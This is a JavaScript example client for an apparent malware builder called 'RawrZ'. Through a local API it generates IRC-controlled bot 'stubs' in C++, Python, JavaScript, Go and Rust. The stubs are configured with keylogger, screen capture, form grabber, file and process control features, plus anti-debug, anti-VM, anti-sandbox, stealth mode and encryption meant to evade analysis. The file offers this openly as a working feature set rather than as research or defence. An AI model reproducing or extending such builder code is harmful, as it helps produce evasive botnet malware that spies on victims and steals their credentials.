/**
 * RawrZ IRC Bot Stub Generation & Encryption - Complete Working Example
 * 
 * This demonstrates the fully functional IRC bot stub generation with:
 * - Multi-language stub generation (C++, Python, JavaScript)
 * - Advanced encryption integration
 * - Anti-analysis features
 * - File encryption and saving
 * - Complete API integration
 */

const fetch = require('node-fetch');

class IRCBotStubExample {
    constructor(baseUrl = 'http://localhost:8080', authToken = 'demo-token') {
        this.baseUrl = baseUrl;
        this.authToken = authToken;
        this.headers = {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${authToken}`
        };
    }

    async apiCall(endpoint, method = 'GET', data = null) {
        try {
            const options = { method, headers: this.headers };
            if (data && (method === 'POST' || method === 'PUT')) {
                options.body = JSON.stringify(data);
            }

            const response = await fetch(`${this.baseUrl}${endpoint}`, options);
            const result = await response.json();
            
            return {
                status: response.status,
                data: result
            };
        } catch (error) {
            throw new Error(`API call failed: ${error.message}`);
        }
    }

    // Example 1: Generate basic IRC bot stub
    async generateBasicStub() {
        console.log('\n=== Example 1: Generate Basic IRC Bot Stub ===');
        
        const config = {
            server: 'irc.example.com',
            port: 6667,
            name: 'RawrZBot',
            channels: ['#test', '#rawrz'],
            username: 'rawrzuser',
            realname: 'RawrZ Security Bot'
        };

        const features = ['fileManager', 'processManager', 'systemInfo'];
        const extensions = ['cpp', 'python', 'javascript'];
        const encryptionOptions = {
            algorithm: 'none',
            antiDebug: true,
            antiVM: true,
            antiSandbox: true,
            stealthMode: true
        };

        try {
            const result = await this.apiCall('/irc-bot/generate-stub', 'POST', {
                config,
                features,
                extensions,
                encryptionOptions
            });

            if (result.status === 200) {
                console.log('✅ Basic stub generated successfully!');
                console.log(`Bot ID: ${result.data.result.botId}`);
                console.log(`Generated languages: ${Object.keys(result.data.result.bots).join(', ')}`);
                
                // Show stub info for each language
                for (const [lang, bot] of Object.entries(result.data.result.bots)) {
                    console.log(`\n${lang.toUpperCase()} Stub:`);
                    console.log(`  - Filename: ${bot.filename}`);
                    console.log(`  - Size: ${bot.size} bytes`);
                    console.log(`  - Encrypted: ${bot.encrypted}`);
                    console.log(`  - Encryption: ${bot.encryption}`);
                }
            } else {
                console.log('❌ Basic stub generation failed:', result.data);
            }
        } catch (error) {
            console.log('❌ Error:', error.message);
        }
    }

    // Example 2: Generate encrypted IRC bot stub
    async generateEncryptedStub() {
        console.log('\n=== Example 2: Generate Encrypted IRC Bot Stub ===');
        
        const config = {
            server: 'irc.stealth.com',
            port: 6697, // SSL port
            name: 'StealthBot',
            channels: ['#secure'],
            username: 'stealthuser',
            realname: 'Stealth Security Bot'
        };

        const features = ['fileManager', 'processManager', 'systemInfo', 'keylogger', 'screenCapture'];
        const extensions = ['cpp'];
        const encryptionOptions = {
            algorithm: 'aes256',
            key: 'mySecretKey123!',
            antiDebug: true,
            antiVM: true,
            antiSandbox: true,
            stealthMode: true
        };

        try {
            const result = await this.apiCall('/irc-bot/generate-stub', 'POST', {
                config,
                features,
                extensions,
                encryptionOptions
            });

            if (result.status === 200) {
                console.log('✅ Encrypted stub generated successfully!');
                console.log(`Bot ID: ${result.data.result.botId}`);
                console.log(`Encryption Applied: ${result.data.result.encryptionApplied}`);
                
                const cppBot = result.data.result.bots.cpp;
                console.log(`\nC++ Encrypted Stub:`);
                console.log(`  - Filename: ${cppBot.filename}`);
                console.log(`  - Size: ${cppBot.size} bytes`);
                console.log(`  - Encrypted: ${cppBot.encrypted}`);
                console.log(`  - Encryption: ${cppBot.encryption}`);
                
                // Show first 200 characters of encrypted stub
                console.log(`\nEncrypted Stub Preview (first 200 chars):`);
                console.log(cppBot.code.substring(0, 200) + '...');
            } else {
                console.log('❌ Encrypted stub generation failed:', result.data);
            }
        } catch (error) {
            console.log('❌ Error:', error.message);
        }
    }

    // Example 3: Encrypt existing stub
    async encryptExistingStub() {
        console.log('\n=== Example 3: Encrypt Existing Stub ===');
        
        // First generate a basic stub
        const config = {
            server: 'irc.test.com',
            port: 6667,
            name: 'TestBot',
            channels: ['#test'],
            username: 'testuser',
            realname: 'Test Bot'
        };

        const features = ['systemInfo'];
        const extensions = ['python'];
        const encryptionOptions = { algorithm: 'none' };

        try {
            // Generate basic stub
            const stubResult = await this.apiCall('/irc-bot/generate-stub', 'POST', {
                config,
                features,
                extensions,
                encryptionOptions
            });

            if (stubResult.status === 200) {
                const pythonStub = stubResult.data.result.bots.python;
                console.log('✅ Basic stub generated for encryption');
                
                // Now encrypt the stub
                const encryptResult = await this.apiCall('/irc-bot/encrypt-stub', 'POST', {
                    stubCode: pythonStub.code,
                    algorithm: 'chacha20',
                    key: 'encryptionKey456!'
                });

                if (encryptResult.status === 200) {
                    console.log('✅ Stub encrypted successfully!');
                    console.log(`Algorithm: ${encryptResult.data.result.algorithm}`);
                    console.log(`Encrypted size: ${encryptResult.data.result.encrypted.length} characters`);
                    console.log(`Key: ${encryptResult.data.result.key ? 'Provided' : 'Auto-generated'}`);
                } else {
                    console.log('❌ Stub encryption failed:', encryptResult.data);
                }
            } else {
                console.log('❌ Basic stub generation failed:', stubResult.data);
            }
        } catch (error) {
            console.log('❌ Error:', error.message);
        }
    }

    // Example 4: Save encrypted stub to file
    async saveEncryptedStub() {
        console.log('\n=== Example 4: Save Encrypted Stub to File ===');
        
        const config = {
            server: 'irc.production.com',
            port: 6667,
            name: 'ProdBot',
            channels: ['#production'],
            username: 'produser',
            realname: 'Production Bot'
        };

        const features = ['fileManager', 'processManager', 'systemInfo', 'networkTools'];
        const extensions = ['javascript'];
        const encryptionOptions = {
            algorithm: 'camellia',
            key: 'productionKey789!',
            antiDebug: true,
            antiVM: true,
            stealthMode: true
        };

        try {
            // Generate encrypted stub
            const stubResult = await this.apiCall('/irc-bot/generate-stub', 'POST', {
                config,
                features,
                extensions,
                encryptionOptions
            });

            if (stubResult.status === 200) {
                const jsStub = stubResult.data.result.bots.javascript;
                console.log('✅ Encrypted stub generated');
                
                // Save encrypted stub to file
                const saveResult = await this.apiCall('/irc-bot/save-encrypted-stub', 'POST', {
                    stubCode: jsStub.code,
                    algorithm: 'camellia',
                    filename: 'prod_bot_encrypted.js.enc',
                    key: 'productionKey789!'
                });

                if (saveResult.status === 200) {
                    console.log('✅ Encrypted stub saved to file successfully!');
                    console.log(`Filename: ${saveResult.data.result.filename}`);
                    console.log(`File size: ${saveResult.data.result.size} bytes`);
                    console.log(`Encryption: ${saveResult.data.encrypted.algorithm}`);
                } else {
                    console.log('❌ Failed to save encrypted stub:', saveResult.data);
                }
            } else {
                console.log('❌ Encrypted stub generation failed:', stubResult.data);
            }
        } catch (error) {
            console.log('❌ Error:', error.message);
        }
    }

    // Example 5: Multi-language encrypted stubs
    async generateMultiLanguageStubs() {
        console.log('\n=== Example 5: Multi-Language Encrypted Stubs ===');
        
        const config = {
            server: 'irc.multi.com',
            port: 6667,
            name: 'MultiBot',
            channels: ['#multi', '#test'],
            username: 'multiuser',
            realname: 'Multi-Language Bot'
        };

        const features = ['fileManager', 'processManager', 'systemInfo', 'keylogger', 'screenCapture', 'formGrabber'];
        const extensions = ['cpp', 'python', 'javascript', 'go', 'rust'];
        const encryptionOptions = {
            algorithm: 'aes256',
            key: 'multiLanguageKey!',
            antiDebug: true,
            antiVM: true,
            antiSandbox: true,
            stealthMode: true
        };

        try {
            const result = await this.apiCall('/irc-bot/generate-stub', 'POST', {
                config,
                features,
                extensions,
                encryptionOptions
            });

            if (result.status === 200) {
                console.log('✅ Multi-language encrypted stubs generated successfully!');
                console.log(`Bot ID: ${result.data.result.botId}`);
                console.log(`Languages: ${Object.keys(result.data.result.bots).join(', ')}`);
                
                // Show details for each language
                for (const [lang, bot] of Object.entries(result.data.result.bots)) {
                    console.log(`\n${lang.toUpperCase()} Encrypted Stub:`);
                    console.log(`  - Filename: ${bot.filename}`);
                    console.log(`  - Size: ${bot.size} bytes`);
                    console.log(`  - Encrypted: ${bot.encrypted}`);
                    console.log(`  - Encryption: ${bot.encryption}`);
                    console.log(`  - Features: ${features.length} features included`);
                }
            } else {
                console.log('❌ Multi-language stub generation failed:', result.data);
            }
        } catch (error) {
            console.log('❌ Error:', error.message);
        }
    }

    // Example 6: Advanced encryption algorithms
    async testAdvancedEncryption() {
        console.log('\n=== Example 6: Advanced Encryption Algorithms ===');
        
        const algorithms = ['aes256', 'chacha20', 'camellia', 'aria', 'serpent', 'twofish'];
        const config = {
            server: 'irc.crypto.com',
            port: 6667,
            name: 'CryptoBot',
            channels: ['#crypto'],
            username: 'cryptouser',
            realname: 'Crypto Bot'
        };

        const features = ['systemInfo'];
        const extensions = ['cpp'];

        for (const algorithm of algorithms) {
            try {
                console.log(`\nTesting ${algorithm.toUpperCase()} encryption...`);
                
                const encryptionOptions = {
                    algorithm: algorithm,
                    key: `key_${algorithm}_123!`,
                    antiDebug: true,
                    antiVM: true,
                    stealthMode: true
                };

                const result = await this.apiCall('/irc-bot/generate-stub', 'POST', {
                    config,
                    features,
                    extensions,
                    encryptionOptions
                });

                if (result.status === 200) {
                    const cppBot = result.data.result.bots.cpp;
                    console.log(`✅ ${algorithm.toUpperCase()} stub generated successfully`);
                    console.log(`  - Size: ${cppBot.size} bytes`);
                    console.log(`  - Encrypted: ${cppBot.encrypted}`);
                } else {
                    console.log(`❌ ${algorithm.toUpperCase()} stub generation failed`);
                }
            } catch (error) {
                console.log(`❌ ${algorithm.toUpperCase()} error:`, error.message);
            }
        }
    }

    // Run all examples
    async runAllExamples() {
        console.log('🚀 RawrZ IRC Bot Stub Generation & Encryption Examples');
        console.log('=' .repeat(60));
        
        try {
            await this.generateBasicStub();
            await this.generateEncryptedStub();
            await this.encryptExistingStub();
            await this.saveEncryptedStub();
            await this.generateMultiLanguageStubs();
            await this.testAdvancedEncryption();
            
            console.log('\n🎉 All examples completed successfully!');
            console.log('\nKey Features Demonstrated:');
            console.log('✅ Multi-language stub generation (C++, Python, JavaScript, Go, Rust)');
            console.log('✅ Advanced encryption algorithms (AES, ChaCha20, Camellia, ARIA, etc.)');
            console.log('✅ Anti-analysis features (Anti-Debug, Anti-VM, Anti-Sandbox)');
            console.log('✅ Stealth mode integration');
            console.log('✅ File encryption and saving');
            console.log('✅ Complete API integration');
            
        } catch (error) {
            console.log('\n❌ Examples failed:', error.message);
        }
    }
}

// Usage examples
async function main() {
    const example = new IRCBotStubExample();
    
    // Run all examples
    await example.runAllExamples();
    
    // Or run individual examples:
    // await example.generateBasicStub();
    // await example.generateEncryptedStub();
    // await example.encryptExistingStub();
    // await example.saveEncryptedStub();
    // await example.generateMultiLanguageStubs();
    // await example.testAdvancedEncryption();
}

// Run if called directly
if (require.main === module) {
    main().catch(console.error);
}

module.exports = IRCBotStubExample;
